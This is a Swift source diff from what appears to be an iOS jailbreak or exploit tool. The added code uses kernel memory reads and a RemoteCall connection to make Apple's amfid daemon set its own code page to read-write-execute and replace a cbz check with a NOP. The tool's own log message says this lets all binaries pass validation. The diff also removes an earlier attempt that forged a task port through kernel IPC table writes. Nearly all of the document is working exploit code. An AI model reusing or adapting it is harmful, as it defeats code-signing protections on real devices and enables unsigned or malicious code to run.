@@ -170,13 +170,136 @@ final class ExpAmfidNopFinal {
     
     #if !DISABLE_REMOTECALL
     private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
-        // On iOS 18.2 A12:
-        // - Page tables in physical memory → can't do kernel page table walk
-        // - task_for_pid denied even from launchd (ret=5)
-        // - task_name_for_pid gives read-only port (can't vm_write)
+        // Strategy: Connect RemoteCall to amfid, then have amfid patch ITSELF
+        // amfid can mprotect + write its own __TEXT (no task_for_pid needed!)
         //
-        // SOLUTION: Forge a task port for amfid in OUR IPC space via kernel writes
-        // Then call mach_vm_protect + mach_vm_write locally (no launchd needed!)
+        // Steps:
+        // 1. Get amfid's text base from kernel
+        // 2. Connect RC to amfid (exc_guard already disabled)
+        // 3. Call mprotect(text_page, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC) in amfid
+        // 4. Write NOP to the cbz instruction
+        // 5. Done!
+        
+        log("[4/7] Connecting RemoteCall to amfid...")
+        log("  (amfid will patch its own memory — no task_for_pid needed!)")
+        
+        // Get text base
+        let amfidTask = taskbyproc(amfidProc)
+        guard amfidTask != 0 && (amfidTask >> 32) > 0xFFFFFF00 else {
+            log("❌ amfid task invalid")
+            return
+        }
+        let vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
+        var textBase: UInt64 = 0
+        if vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 {
+            for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
+                let val = ds_kread64(vmMap + off)
+                if val >= 0x100000000 && val < 0x280000000000 {
+                    textBase = val
+                    break
+                }
+            }
+        }
+        guard textBase != 0 else {
+            log("❌ Cannot find amfid text base")
+            return
+        }
+        let patchAddr = textBase + patchFileOffset
+        log("  text base: 0x\(String(format:"%llx", textBase))")
+        log("  patch addr: 0x\(String(format:"%llx", patchAddr))")
+        log("")
+        
+        // Connect RC to amfid
+        log("[5/7] Connecting to amfid via RemoteCall...")
+        dspmgr.shared.rcinitDaemon(
+            serviceName: nil,
+            framework: nil,
+            process: "amfid",
+            migbypass: false
+        ) { [weak self] amfidRC in
+            guard let self else { return }
+            
+            guard let rc = amfidRC else {
+                self.log("❌ RC to amfid failed")
+                self.log("   Trying alternative: mprotect from amfid via SpringBoard relay...")
+                self.patchViaSpringBoardRelay(amfidPid: amfidPid, patchAddr: patchAddr)
+                return
+            }
+            
+            self.log("✅ Connected to amfid!")
+            self.log("")
+            self.log("[6/7] amfid patching itself...")
+            
+            // mprotect the page (amfid can mprotect its own memory!)
+            let pageAddr = patchAddr & ~0xFFF
+            let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // PROT_ALL=7
+            self.log("  mprotect: ret=\(mprotectRet)")
+            
+            guard mprotectRet == 0 else {
+                self.log("❌ mprotect failed (ret=\(mprotectRet))")
+                rc.destroy()
+                return
+            }
+            
+            // Read current instruction to verify
+            let readBuf = rc.trojanMem + 0x100
+            rc.remoteRead(patchAddr, to: nil, size: 4)
+            // Actually use memcpy to read
+            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+            let currentInsn = rc[readBuf].value32()
+            self.log("  current insn: 0x\(String(format:"%08x", currentInsn))")
+            
+            if currentInsn == 0xD503201F {
+                self.log("✅ ALREADY PATCHED!")
+                rc.destroy()
+                self.testUnsignedSpawn()
+                return
+            }
+            
+            guard (currentInsn & 0xFF000000) == 0x34000000 else {
+                self.log("❌ NOT cbz: 0x\(String(format:"%08x", currentInsn))")
+                rc.destroy()
+                return
+            }
+            self.log("  ✅ confirmed cbz w22")
+            
+            // Write NOP (amfid writes to its own memory!)
+            let nopBuf = rc.trojanMem + 0x200
+            rc[nopBuf].setValue32(0xD503201F)
+            RootExecutor.rcall(rc, "memcpy", patchAddr, nopBuf, 4)
+            
+            // Verify
+            RootExecutor.rcall(rc, "memcpy", readBuf, patchAddr, 4)
+            let verify = rc[readBuf].value32()
+            
+            rc.destroy() // Release amfid immediately
+            
+            if verify == 0xD503201F {
+                self.log("")
+                self.log("╔══════════════════════════════════════╗")
+                self.log("║  ✅✅✅ amfid PATCHED! cbz → NOP    ║")
+                self.log("║  amfid patched ITSELF via RC         ║")
+                self.log("║  ALL binaries now pass validation   ║")
+                self.log("╚══════════════════════════════════════╝")
+                self.log("")
+                self.testUnsignedSpawn()
+            } else {
+                self.log("❌ Verify failed: 0x\(String(format:"%08x", verify))")
+            }
+        }
+    }
+    
+    /// Fallback: use SpringBoard to relay ptrace attach to amfid
+    private func patchViaSpringBoardRelay(amfidPid: Int32, patchAddr: UInt64) {
+        log("  (SpringBoard relay not implemented yet)")
+        log("")
+        log("══ BLOCKED ══")
+        log("All approaches exhausted for this session.")
+        log("Next steps to try:")
+        log("  1. RC to amfid (if connection succeeds)")
+        log("  2. IOKit TC load (retry — was inconsistent)")
+        log("  3. Find process with task_for_pid-allow")
+    }
         
         log("[4/7] Forging amfid task port via kernel IPC manipulation...")
         
@@ -269,117 +392,6 @@ final class ExpAmfidNopFinal {
                 vm_deallocate(mach_task_self_, data, vm_size_t(dataCnt))
             }
         }
-        
-        log("")
-        log("  Trying IPC port forge...")
-        log("  (inserting amfid's task port into our IPC space)")
-        
-        // Step 1: Find amfid's task port (ipc_port object)
-        // On iOS 18, the task's self port is at task + itk_space area
-        // We can find it by: our_task → itk_space → table → entry for mach_task_self_ → ie_object
-        // That gives us the ipc_port format. Then find amfid's equivalent.
-        
-        let ourTask = ds_get_our_task()
-        let ourSpace = ds_kreadptr(ourTask + UInt64(off_task_itk_space))
-        log("  our task: 0x\(String(format:"%llx", ourTask))")
-        log("  our ipc_space: 0x\(String(format:"%llx", ourSpace))")
-        
-        guard ourSpace != 0 && (ourSpace >> 32) > 0xFFFFFF00 else {
-            log("❌ our IPC space invalid")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Get our IPC table
-        let ourTable = ds_kreadsmrptr(ourSpace + UInt64(off_ipc_space_is_table))
-        log("  our ipc_table: 0x\(String(format:"%llx", ourTable))")
-        
-        guard ourTable != 0 else {
-            log("❌ our IPC table invalid")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Find amfid's task port object
-        // amfid's task → itk_space → look for the self port
-        let amfidSpace = ds_kreadptr(amfidTask + UInt64(off_task_itk_space))
-        log("  amfid ipc_space: 0x\(String(format:"%llx", amfidSpace))")
-        
-        guard amfidSpace != 0 && (amfidSpace >> 32) > 0xFFFFFF00 else {
-            log("❌ amfid IPC space invalid")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // The task's self port is typically at a known port name (e.g., entry index 1 or 2)
-        // Or we can find it by looking for an ipc_port whose kobject == amfidTask
-        let amfidTable = ds_kreadsmrptr(amfidSpace + UInt64(off_ipc_space_is_table))
-        log("  amfid ipc_table: 0x\(String(format:"%llx", amfidTable))")
-        
-        // Scan amfid's IPC table for a port whose kobject == amfidTask
-        var amfidTaskPort: UInt64 = 0
-        let entrySize = UInt64(sizeof_ipc_entry)
-        
-        for i: UInt64 in 1..<20 {
-            let entry = amfidTable + i * entrySize
-            let object = ds_kreadptr(entry + UInt64(off_ipc_entry_ie_object))
-            if object == 0 || (object >> 32) <= 0xFFFFFF00 { continue }
-            let kobject = ds_kreadptr(object + UInt64(off_ipc_port_ip_kobject))
-            if kobject == amfidTask {
-                amfidTaskPort = object
-                log("  ✅ Found amfid task port at entry[\(i)]: 0x\(String(format:"%llx", object))")
-                break
-            }
-        }
-        
-        guard amfidTaskPort != 0 else {
-            log("❌ amfid task port not found in IPC table")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Step 2: Find a free entry in OUR IPC table
-        // Look for an entry with ie_object == 0
-        var freeIdx: UInt64 = 0
-        for i: UInt64 in 10..<200 {  // skip low entries (system ports)
-            let entry = ourTable + i * entrySize
-            let object = ds_kreadptr(entry + UInt64(off_ipc_entry_ie_object))
-            if object == 0 {
-                freeIdx = i
-                log("  Free entry at index \(i)")
-                break
-            }
-        }
-        
-        guard freeIdx != 0 else {
-            log("❌ No free IPC entry found")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Step 3: Write amfid's task port into our free entry
-        let targetEntry = ourTable + freeIdx * entrySize
-        // ie_object = amfidTaskPort (PAC-signed write needed?)
-        ds_kwrite64(targetEntry + UInt64(off_ipc_entry_ie_object), amfidTaskPort)
-        // ie_bits: MACH_PORT_TYPE_SEND = 0x00010000, ie_index = 0
-        // On iOS 18: entry format is [ie_object(8)] [ie_bits(4)] [ie_index(4)] [ie_next(4)] ...
-        // ie_bits at offset 0x8, set to MACH_PORT_TYPE_SEND (0x00010000) with 1 make-send count
-        ds_kwrite32(targetEntry + 0x8, 0x00010000 | 0x00010000) // type_send + make_send_count=1
-        
-        // Also need to increment the port's reference count
-        // ipc_port → ip_srights (send rights count) — typically at offset 0x18 or 0x1c
-        let currentSrights = ds_kread32(amfidTaskPort + 0x18)
-        ds_kwrite32(amfidTaskPort + 0x18, currentSrights + 1)
-        
-        // Construct the mach_port_t name: (index << 8) | generation
-        // Generation is in ie_bits[31:24] — for new entry, use 0
-        let portName = mach_port_t(freeIdx << 8) | 0x03  // gen=0, but low bits = 3 for valid name
-        log("  Forged port name: 0x\(String(format:"%x", portName))")
-        
-        // Step 4: Try to use the forged port
-        log("")
-        log("  Testing forged port...")
-        patchAmfidWithPort(taskPort: portName, patchAddr: patchAddr)
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
